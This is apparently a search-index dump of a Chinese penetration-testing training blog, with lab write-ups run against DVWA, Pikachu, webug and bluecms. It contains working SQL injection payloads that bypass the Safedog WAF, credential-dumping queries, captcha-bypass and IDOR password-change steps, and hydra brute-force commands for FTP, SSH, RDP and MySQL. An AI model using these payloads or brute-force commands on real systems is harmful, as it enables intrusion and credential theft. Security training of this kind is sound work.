MS08-067漏洞","date":"2023-03-19","objectID":"/posts/msf/msf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:2:0","tags":[],"title":"MSF漏洞利用","uri":"/posts/msf/msf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["WAF"],"content":"（1）实现WAF安装与配置 （2）分别在无WAF和有WAF的情况下，利用SQLMap进行注入，提供注入结果截图 （3）在有WAF的情况下，手工注入出DVWA数据库中的user和password，提供注入过程说明文档 ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:0:0","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"1 实验环境 软件名称 版本 部署方式 IP safedog 官网下载安装包 172.31.5.40 dvwa phpStudy2018部署 172.31.5.40 SQLMap kali 自带 172.31.5.9 ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:1:0","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"2 安装DVWA 注意：这里使用phpStudy 2018进行部署（尽量不要用最新版，问题较多） 下载DVWA源码，防止于网站根目录下 将DVWA\\config\\目录下的文件重命名为config.inc.php，并修改其中的数据库账号和密码为：root/root（根据实际情况填写） 修改php.ini 中的两个参数为On 以系统服务的方式启动apache和mysql 访问 http://172.31.5.40/dvwa/ 进入DVWA安装界面 点击Create/Reset Database安装成功后进入登陆界面（默认账号：admin/password） ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:2:0","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"3 安装safedog 官网下载最新版安全狗Apache版本 http://free.safedog.cn/ 双击安装包进行安装，出现如下界面说明可以正常安装，如果服务名为空则不正常（没有以系统服务运行apache） ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:3:0","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"4 SQLMap 注入DVWA数据库 将DVWA安全等级设置为Low ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:4:0","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"4.1 未开启safedog时 打开sql注入模块，并获取URL以及登陆cookie 使用sqlmap 对id参数进行注入 sqlmap --batch -u \"http://172.31.5.40/dvwa/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"security=low; PHPSESSID=5oe9garl47s6buhb0rc7iav6g3\" -p id 注入成功 ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:4:1","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"4.2 开启safedog时 再次执行注入（注意要删除上一次注入的缓存文件），注入失败。检测到了被防火墙拦截 手工注入 1’ and ‘1’=‘1 提交后被安全狗拦截 ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:4:2","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"5 safedog 绕过 ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:5:0","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"5.1 and 关键字绕过 内联注释：是MySQL为了保持与其他数据兼容，将MySQL中特有的语句放在/!…/中，这些语句在不兼容 的数据库中不执行，而在MySQL自身却能识别。 /*!11445*/ 表示版本号；从00000~99999 ，需要小于mysql当前的版本； 例如：mysql 5.6 ，则版本号需要小于 56000 才能执行成功 这个版本号有很多可以多尝试几个，这个原理就是在mysql数据库当中/*！加上指定的版本号来执行sql 语句： 1'/*!11445and*/'1'='1 #成功绕过and关键字拦截 ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:5:1","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"5.2 order by关键字绕过 1' order by 1 # 提交此参数会被拦截 使用group by 替换 1' group by 1 # 成功绕过order by关键字拦截 多次尝试，当使用如下语句则报错，可知注入的列数为2 1' group by 3 # ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:5:2","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"5.3 union 关键字绕过 %0A 表示回车 %23 表示 # 为防止URL二次编码，以下实验使用HackerBar插件进入注入绕过（%会被二次编码，失去本来的意义） 使用union关键字，被拦截 1' union select 1,2 --+ 使用以下注入注入参数 1' regexp \"%0A%23\" /*!11144union %0A select */1,2 --+ 成功绕过union关键字拦截 ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:5:3","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"5.4 database 关键字绕过（获取库名） 尝试获取database()，发现被拦截 1' regexp \"%0A%23\" /*!11144union %0A select */database(),2--+ 再次使用內联注释绕过database() 拦截，获取到数据库名为dvwa ?id=-1' regexp \"%0A%23\"/*!11144union %0A select*/ 1,database(%0A /*!11144*/)--+ ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:5:4","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"5.5 user() 关键字绕过（获取用户名） -1' regexp \"%0A%23\"/*!11144union %0A select*/ user(%0A /*!11144*/),database(%0A /*!11144*/)--+ ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:5:5","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"5.6 获取所有库名 尝试获取所有的库名，发现information_schema.schemata被拦截 分别对schema_name 和information_schema加上内联注释进行绕过（不清楚其中哪个被拦截，直接全加上） ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:5:6","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"5.7 获取所有表 获取dvwa库里面所有的表名 -1' union /*!--+/*%0aselect/*!1,*/ group_concat(column_name) /*!from*/ /*!--+/*%0ainformation_schema./*!columns*/ where table_name='users' --+ ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:5:7","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["WAF"],"content":"5.8 注入出账号密码 -1' union /*!--+/*%0aselect/*!1,*/ group_concat(concat_ws(0x7e,user,password)) /*!from*/ dvwa.users --+ 在线解密 https://www.cmd5.com/ 得到admin用户密码为password ","date":"2023-03-18","objectID":"/posts/waf/safedog_bypass/:5:8","tags":[],"title":"Safedog_bypass","uri":"/posts/waf/safedog_bypass/"},{"categories":["Brute_Force"],"content":"（1）验证码绕过（on client）+ 验证码绕过（on server） （2）验证码绕过（on server）实验中，为什么burp拦截开启的状态下，通过Repeater进行重放不会刷新验证码，关闭拦截后才会刷新验证码？ ","date":"2023-03-18","objectID":"/posts/brute_force/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/:0:0","tags":[],"title":"验证码绕过","uri":"/posts/brute_force/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/"},{"categories":["Brute_Force"],"content":"1 实验环境 软件名称 版本 部署方式 IP Pikachu latest docker run -d -p 8080:80 –name pikachu area39/pikachu 172.31.5.7 ","date":"2023-03-18","objectID":"/posts/brute_force/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/:1:0","tags":[],"title":"验证码绕过","uri":"/posts/brute_force/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/"},{"categories":["Brute_Force"],"content":"2 验证码介绍及分类 在安全领域，验证码主要分为两大类：操作验证码和身份验证码。 验证码的主要作用：防止恶意暴力破解、恶意注册、刷票、论坛灌水等一切脚本行为。 验证码的分类：手机短信、手机语音、通用文字、加减法、非通用文字、非通用文字加背景随机加拉 伸、无感知、滑动拼图、文字点选、图标点选、推理拼图、短信上行、语序点选、空间推理、语音验证 等等。 ","date":"2023-03-18","objectID":"/posts/brute_force/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/:2:0","tags":[],"title":"验证码绕过","uri":"/posts/brute_force/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/"},{"categories":["Brute_Force"],"content":"3 验证码绕过（on client） 打开pikachu的暴力破解模块 当未输入验证码的时候，提示“请输入验证码”： 当输入错误验证码的时候提示“验证码输入错误”： 当输入正确验证码（账号随意输入）的时候提示“用户名或者密码不存在”： 开启burp抓包，多次修改密码，使用repeater模块发送后，均返回状态码200，说明同一验证码可使用多次 使用intruder模块对password进行爆破，成功拿到密码 通过浏览器查看，可知该验证码由前端生成，因此还可通过禁用前端js功能进行绕过 禁用js也可绕过验证码登录 ","date":"2023-03-18","objectID":"/posts/brute_force/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/:3:0","tags":[],"title":"验证码绕过","uri":"/posts/brute_force/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/"},{"categories":["Brute_Force"],"content":"4 验证码绕过（on server） 截获数据包 使用repeater模块，输入任意验证码提示：验证码错误 在输入正确的二维码的情况下，并多次修改密码，提示：username or password is not exists～ 说明二维码是可以重复多次使用的（可以暴力破解） 使用暴力破解，成功破解密码 查看源码 docker exec pikachu bash -c 'cat /app/vul/burteforce/bf_server.php' 可以发现，后端在使用验证码后，未进行销毁 ","date":"2023-03-18","objectID":"/posts/brute_force/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/:4:0","tags":[],"title":"验证码绕过","uri":"/posts/brute_force/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/"},{"categories":["logic"],"content":"（1）密码修改逻辑漏洞 ","date":"2023-03-18","objectID":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/:0:0","tags":[],"title":"密码修改逻辑漏洞","uri":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"categories":["logic"],"content":"1 实验环境 软件名称 版本 部署方式 IP webug latest docker run -d -p 8082:80 -p 33060:3306 –name webug area39/webug 172.31.5.7 ","date":"2023-03-18","objectID":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/:1:0","tags":[],"title":"密码修改逻辑漏洞","uri":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"categories":["logic"],"content":"2 逻辑漏洞概述 由于程序逻辑输入管控不严，导致程序不能够正常处理或处理错误。一般出现在登录注册、密码找回、信息查看、交易支付金额等位置，由于逻辑漏洞产生的流量多数为合法流量，一般的防护手段或设备无法阻止，也导致了逻辑漏洞成为了企业防护中的难题 。 ","date":"2023-03-18","objectID":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/:2:0","tags":[],"title":"密码修改逻辑漏洞","uri":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"categories":["logic"],"content":"3 如何挖掘逻辑漏洞 ","date":"2023-03-18","objectID":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/:3:0","tags":[],"title":"密码修改逻辑漏洞","uri":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"categories":["logic"],"content":"3.1 注册点 注册功能可能出现任意用户注册、短信轰炸等问题 前端验证：判断是否有任意用户注册 手机验证码验证：验证码是否可以暴力破解，验证码与当前手机号没有检验匹配 用户名密码注册：是否会导致批量注册 ","date":"2023-03-18","objectID":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/:3:1","tags":[],"title":"密码修改逻辑漏洞","uri":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"categories":["logic"],"content":"3.2 登陆点 可能出现任意用户登陆、短信轰炸等问题 前端验证：判断是否有任意用户登陆，是否有验证码回显，是否可以修改返回包造成任意用户登录问题 手机验证码验证：是否可以爆破验证码，验证码与当前手机号有没有检验匹配 账号密码登录：没有验证码或者是否存在验证码可以绕过（可以暴力破解） ","date":"2023-03-18","objectID":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/:3:2","tags":[],"title":"密码修改逻辑漏洞","uri":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"categories":["logic"],"content":"3.3 密码找回点 验证码是否可以多次使用 验证码是否直接返回在数据包中 验证码未绑定用户 修改接受的手机或者邮箱进行密码重置 前端验证绕过 验证步骤绕过（先获取手机验证码，再输入要修改的邮箱和密码） 未校验用户字段的值 修改密码处id可被替换 。。。 ","date":"2023-03-18","objectID":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/:3:3","tags":[],"title":"密码修改逻辑漏洞","uri":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"categories":["logic"],"content":"4 密码修改逻辑漏洞 打开webug逻辑漏洞模块（默认账号：admin/admin, 数据库账号root/toor） 后台页面 进入容器查看网站后台管理系统的账号密码，可以看到有两个账号 [root@centos7 ~]# docker exec webug bash -c 'mysql -uroot -ptoor -e \"use webug;select * from user_test\\G\"' *************************** 1. row *************************** id: 1 username: admin password: admin *************************** 2. row *************************** id: 2 username: aaaaa password: asdfsadf ","date":"2023-03-18","objectID":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/:4:0","tags":[],"title":"密码修改逻辑漏洞","uri":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"categories":["logic"],"content":"4.1 修改密码未校验旧密码 使用账号aaaaa/asdfsadf 登录，发现404报错，这是由于webug自身的bug引起的 删除URL中的pt_env后正常访问，是一个可以修改密码的页面 输入任意密码后提交 发现可以正常提交（未对旧密码做验证） 再次查看后台数据库账号密码，发现密码修改成功 [root@centos7 ~]# docker exec webug bash -c 'mysql -uroot -ptoor -e \"use webug;select * from user_test\\G\"' *************************** 1. row *************************** id: 1 username: admin password: admin *************************** 2. row *************************** id: 2 username: aaaaa password: 123 #密码已被修改 ","date":"2023-03-18","objectID":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/:4:1","tags":[],"title":"密码修改逻辑漏洞","uri":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"categories":["logic"],"content":"4.2 普通用户修改管理员账号密码 使用burp抓包，使用账号aaaaa/123登录后台，再次提交修改密码的请求。 发现其中有个字段id=2（通常0或者1是管理员的标识） 将字段值改为1后，放行数据包。返回状态码200 查看后台数据库信息，发现管理员账号密码已被修改 [root@centos7 ~]# docker exec webug bash -c 'mysql -uroot -ptoor -e \"use webug;select * from user_test\\G\"' *************************** 1. row *************************** id: 1 username: admin password: test *************************** 2. row *************************** id: 2 username: aaaaa password: test ","date":"2023-03-18","objectID":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/:4:2","tags":[],"title":"密码修改逻辑漏洞","uri":"/posts/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"categories":["旁注"],"content":"（1）bluecms旁注漏洞练习 （2）为什么旁站攻击可以拿下主站？ （3）跨库的意思是什么？ ","date":"2023-03-12","objectID":"/posts/side/%E6%97%81%E6%B3%A8%E4%B8%8E%E8%B7%A8%E5%BA%93/:0:0","tags":[],"title":"旁注与跨库","uri":"/posts/side/%E6%97%81%E6%B3%A8%E4%B8%8E%E8%B7%A8%E5%BA%93/"},{"categories":["旁注"],"content":"1 实验环境 软件名称 版本 部署方式 IP bluecms v1.6 sp1 phpStudy源码部署 172.31.5.1 将bluecms源码放入phpstudy网站目录中 访问安装链接进行安装 http://172.31.5.1/bluecms/uploads/install/ 点击下一步，返回空白页面。说明安装成功 ","date":"2023-03-12","objectID":"/posts/side/%E6%97%81%E6%B3%A8%E4%B8%8E%E8%B7%A8%E5%BA%93/:1:0","tags":[],"title":"旁注与跨库","uri":"/posts/side/%E6%97%81%E6%B3%A8%E4%B8%8E%E8%B7%A8%E5%BA%93/"},{"categories":["旁注"],"content":"2 旁注简介 ","date":"2023-03-12","objectID":"/posts/side/%E6%97%81%E6%B3%A8%E4%B8%8E%E8%B7%A8%E5%BA%93/:2:0","tags":[],"title":"旁注与跨库","uri":"/posts/side/%E6%97%81%E6%B3%A8%E4%B8%8E%E8%B7%A8%E5%BA%93/"},{"categories":["旁注"],"content":"2.1 原理 在渗透测试过程中，如果正面难以突破，那么就采用一些迂回战术，从侧面来进行。也就是采用一些间接的方法，例如旁注，通过旁站来进行渗透。 **什么是旁注？**在同一服务器上有多个站点，我们要攻击的这个站点假设没有漏洞，我们可以攻击服务器上的任意一个站点，这个就是旁注。（假设A网站和B网站在同一个服务器上，攻击A网站，但是A网站没有漏洞，B网站有漏洞，这时可以通过攻击B网站找到服务器） 什么是跨库？跨库查询是指由于权限设置不严格，导致普通帐号被授予过高的权限，从而使得其可以对其他的数据库进行操作。比如，在mysql中，informatin_schema 这个表默认只有root有权限进行操作。但是如果一个普通账户权限过高后，他便可以对该数据库进行操作，从而拿到整个数据库的信息。 ","date":"2023-03-12","objectID":"/posts/side/%E6%97%81%E6%B3%A8%E4%B8%8E%E8%B7%A8%E5%BA%93/:2:1","tags":[],"title":"旁注与跨库","uri":"/posts/side/%E6%97%81%E6%B3%A8%E4%B8%8E%E8%B7%A8%E5%BA%93/"},{"categories":["旁注"],"content":"2.2 示例 假如在某次渗透测试过程中我们发现主站难以攻破，通过子域名发现存在旁站bluecms，于是通过旁站来进行攻击： 2.2.1 发现管理页 打开bluecms主页 ，尝试登录admin账号，密码任意输入。 http://172.31.5.1/bluecms/uploads/ 点击登录，发现提示： 猜测该网站有后台管理页面，通过站点扫描成功找到后台登录页面 http://172.31.5.1/bluecms/uploads/admin/login.php?act=login 2.2.2 爆破管理员密码 使用admin账号尝试多次密码，账号未被锁定，且没有验证码功能。通过爆破获得密码admin 使用账号admin/admin成功登录后台 2.2.3 发现注入点 浏览后台，发现一个功能：获取js 点击获取js，得到一个链接 http://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=1 2.2.4 sql注入拿到账号 修改id值为-1 order by 1，发现成功执行。可能是一个注入点 直接使用order by 进行注入，多次尝试后，得到列数为7（ 8报错） 使用union关键字注入（注意这里可能由于环境原因导致没有回显，使用火狐浏览器，点击箭头所指处可获得结果） 扩展链接：怪异模式和标准模式 获得数据库名bluecms 获得用户名 获得当前库中的所有表 http://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=-1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database() 注入blue_user表中的字段，发现报错，这里有过滤，单引号前面出现 \\ ，证明单引号被转义了 http://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=-1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='blue_user' 使用16进制进行绕过（blue_user 16进制编码为 0x626c75655f75736572 ）： http://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=-1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x626c75655f75736572 获取到blue_user表中的字段 注入bluecms库中blue_user表中user_name以及pwd的字段内容(0x20 是空格的十六进制表示）： http://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=-1 union select 1,2,3,4,5,6,concat_ws(0x20,user_name,pwd) from blue_user 至此，就拿下了该系统的整个数据库。后面就可以考虑跨库了（这里不做演示） ","date":"2023-03-12","objectID":"/posts/side/%E6%97%81%E6%B3%A8%E4%B8%8E%E8%B7%A8%E5%BA%93/:2:2","tags":[],"title":"旁注与跨库","uri":"/posts/side/%E6%97%81%E6%B3%A8%E4%B8%8E%E8%B7%A8%E5%BA%93/"},{"categories":["Brute_Force"],"content":"暴力猜解：hydra实现对ftp、ssh、rdp、mysql的暴力破解 ","date":"2023-03-10","objectID":"/posts/brute_force/brute_force/:0:0","tags":[],"title":"Brute_force","uri":"/posts/brute_force/brute_force/"},{"categories":["Brute_Force"],"content":"1 实验环境 服务名称 部署方式 版本 IP FTP phpStudy部署 172.31.5.1 MySQL phpStudy部署 172.31.5.1 RDP 系统自开，需要手动开启 172.31.5.33 ssh 系统自带，需要手动开启 172.31.5.7 ","date":"2023-03-10","objectID":"/posts/brute_force/brute_force/:1:0","tags":[],"title":"Brute_force","uri":"/posts/brute_force/brute_force/"},{"categories":["Brute_Force"],"content":"2 暴力拆解简介 暴力破解是一种针对于密码的破译方法，即通过密码字典逐个尝试直到找出真正的密码。 ","date":"2023-03-10","objectID":"/posts/brute_force/brute_force/:2:0","tags":[],"title":"Brute_force","uri":"/posts/brute_force/brute_force/"},{"categories":["Brute_Force"],"content":"2.1 C/S架构暴力破解 常见爆破协议和数据库： FTP SSH SMB SQL server MySQL Redis ","date":"2023-03-10","objectID":"/posts/brute_force/brute_force/:2:1","tags":[],"title":"Brute_force","uri":"/posts/brute_force/brute_force/"},{"categories":["Brute_Force"],"content":"2.2 B/S架构暴力破解 暴力破解产生是由于服务器没有对接收的参数进行限制，导致攻击者可以通过暴力手段进行破解所需要的信息(如账号,密码,验证码等)，暴力破解的原理就是穷举法，其基本思想是根据部分条件确定已知条件的大致范围，并在此范围内对所有可能的情况逐一验证,直到全部情况验证完毕。 ","date":"2023-03-10","objectID":"/posts/brute_force/brute_force/:2:2","tags":[],"title":"Brute_force","uri":"/posts/brute_force/brute_force/"},{"categories":["Brute_Force"],"content":"3 暴力破解演示 ","date":"2023-03-10","objectID":"/posts/brute_force/brute_force/:3:0","tags":[],"title":"Brute_force","uri":"/posts/brute_force/brute_force/"},{"categories":["Brute_Force"],"content":"3.1 hydra 介绍 hydra 是一个网络帐号破解工具，支持多种协议。其作者是van Hauser,David Maciejak与其共同维 护。hydra在所有支持GCC的平台能很好的编译，包括Linux,所有版本的BSD,Mac OS, Solaris等 hydra 常用参数： -l 指定一个用户名 -P 指定一个密码字典 -s 指定端口 -L 指定一个用户名字典 -vV 显示每次的尝试信息 -f 遇到正确的密码，停止爆破 -o 将结果输出到文件中 -M 指定一个服务器列表 -t Tasks同时运行的线程数,默认为16 -e nsr n：尝试空密码 s：将用户名作为密码 r：将用户名反向 ","date":"2023-03-10","objectID":"/posts/brute_force/brute_force/:3:1","tags":[],"title":"Brute_force","uri":"/posts/brute_force/brute_force/"},{"categories":["Brute_Force"],"content":"3.2 FTP 爆破 使用phpStudy Pro搭建FTP站点，账号/密码：test/test。注意：在首页开启ftp #执行爆破命令 hydra 192.168.108.129 ftp -l ftp -P pwd.txt -vV -f -e ns 爆破成功 ","date":"2023-03-10","objectID":"/posts/brute_force/brute_force/:3:2","tags":[],"title":"Brute_force","uri":"/posts/brute_force/brute_force/"},{"categories":["Brute_Force"],"content":"3.2 ssh 爆破 以CentOS7（IP：172.31.5.7），开启sshd服务 systemctl start sshd 创建账号test, 密码：test useradd test \u0026\u0026 echo test | passwd --stdin test 执行爆破命令 hydra 172.31.5.7 ssh -l test -P pwd.txt -t 5 -vV -e ns 爆破成功 ","date":"2023-03-10","objectID":"/posts/brute_force/brute_force/:3:3","tags":[],"title":"Brute_force","uri":"/posts/brute_force/brute_force/"},{"categories":["Brute_Force"],"content":"3.3 RDP 爆破 以windows7为例（IP： 172.31.5.33），开启RDP服务并授权test账号连接，账号密码test 执行爆破命令 hydra 172.31.5.33 rdp -l test -P pwd.txt -vV -f -e nsr 爆破成功 ","date":"2023-03-10","objectID":"/posts/brute_force/brute_force/:3:4","tags":[],"title":"Brute_force","uri":"/posts/brute_force/brute_force/"},{"categories":["Brute_Force"],"content":"3.4 MySQL 爆破 phpStudy 首页开启MySQL服务 安装数据库前端管理工具 打开前端管理工具 新建账号test%，密码test 执行爆破命令 hydra 172.31.5.1 mysql -l test -P pwd.txt -vV -f -e nsr 爆破成功 ","date":"2023-03-10","objectID":"/posts/brute_force/brute_force/:3:5","tags":[],"title":"Brute_force","uri":"/posts/brute_force/brute_force/"},{"categories":["BAC"],"content":"（1）远程代码执行漏洞：DVWA-Low级别，要求把命令的操作方式全部练习一遍； ","date":"2023-03-10","objectID":"/posts/bac/bac/:0:0","tags":[],"title":"BAC","uri":"/posts/bac/bac/"},{"categories":["BAC"],"content":"一、实验环境 软件名称 部署方式 版本 IP Pikachu docker run -d -p 8080:80 –name pikachu area39/pikachu latest 172.31.5.7 ","date":"2023-03-10","objectID":"/posts/bac/bac/:1:0","tags":[],"title":"BAC","uri":"/posts/bac/bac/"},{"categories":["BAC"],"content":"二、漏洞简介（BAC） 越权访问（Broken Access Control，简称BAC）是Web应用程序中一种常见的漏洞，由于其存在范围广、危害大，被OWASP列为Web应用十大安全隐患的第一名。 该漏洞是指应用在检查授权时存在纰漏，使得攻击者在获得低权限用户账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。 越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。 在实际的代码审计中，这种漏洞往往很难通过工具进行自动化监测，因此在实际应用中危害很大。其与未授权访问有一定差别，目前存在着两种越权操作类型，横向越权操作（水平越权）和纵向越权操作（垂直越权）。 水平越权: 指相同权限下不同的用户可以互相访问 垂直越权: 指使用权限低的用户可以访问到权限较高的用户 **水平越权测试方法：**主要通过看看能否通过A用户操作影响到B用户 **垂直越权测试方法：**看看低权限用户是否能越权使用高权限用户的功能，比如普通用户可以使用管理员的功能。 ","date":"2023-03-10","objectID":"/posts/bac/bac/:2:0","tags":[],"title":"BAC","uri":"/posts/bac/bac/"},{"categories":["BAC"],"content":"三、漏洞演示 ","date":"2023-03-10","objectID":"/posts/bac/bac/:3:0","tags":[],"title":"BAC","uri":"/posts/bac/bac/"},{"categories":["BAC"],"content":"3.1 水平越权 使用allen用户登录并查看个人信息 将URL中的username参数值改为lucy后回车，查看到lucy用户的信息 ","date":"2023-03-10","objectID":"/posts/bac/bac/:3:1","tags":[],"title":"BAC","uri":"/posts/bac/bac/"},{"categories":["BAC"],"content":"3.2 垂直越权 这里有两个用户admin/123456, pikachu/000000, admin是超级boss 使用admin账号登录，发现权限较大 点击添加用户获得添加用户的接口（burp抓包发现该接口没有提交额外的参数进行身份验证） http://172.31.5.7:8080/vul/overpermission/op2/op2_admin_edit.php 使用pikachu用户登录并访问上文获得的接口，发现可以正常访问 输入dd后点击创建，会回到登录界面。使用admin账号登录后，发现dd用户已被创建 ","date":"2023-03-10","objectID":"/posts/bac/bac/:3:2","tags":[],"title":"BAC","uri":"/posts/bac/bac/"},{"categories":["BAC"],"content":"四、漏洞修复 1、前后端同时对用户输入信息进行校验，双重验证机制 2、执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限 3、特别敏感操作可以让用户再次输入密码或其他的验证信息，防范CSRF 4、从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 user 信息 5、直接对象引用的资源ID进行加密，防止攻击者枚举ID，敏感数据特殊化处理 ","date":"2023-03-10","objectID":"/posts/bac/bac/:4:0","tags":[],"title":"BAC","uri":"/posts/bac/bac/"},{"categories":[],"content":"（1）远程代码执行漏洞：DVWA-Low级别，要求把命令的操作方式全部练习一遍； ","date":"2023-03-10","objectID":"/posts/rce/rce/:0:0","tags":[],"title":"RCE","uri":"/posts/rce/rce/"},{"categories":[],"content":"一、实验环境 软件名称 版本 部署方式 IP DVWA latest docker run -d -p 80:80 docker.io/sagikazarmark/dvwa 172.31.5.7 ","date":"2023-03-10","objectID":"/posts/rce/rce/:1:0","tags":[],"title":"RCE","uri":"/posts/rce/rce/"},{"categories":[],"content":"二、什么是RCE？ RCE英文全称：remote command/code execute，分为 远程命令执行和 远程代码执行。 RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 ","date":"2023-03-10","objectID":"/posts/rce/rce/:2:0","tags":[],"title":"RCE","uri":"/posts/rce/rce/"},{"categories":[],"content":"2.1 远程命令执行 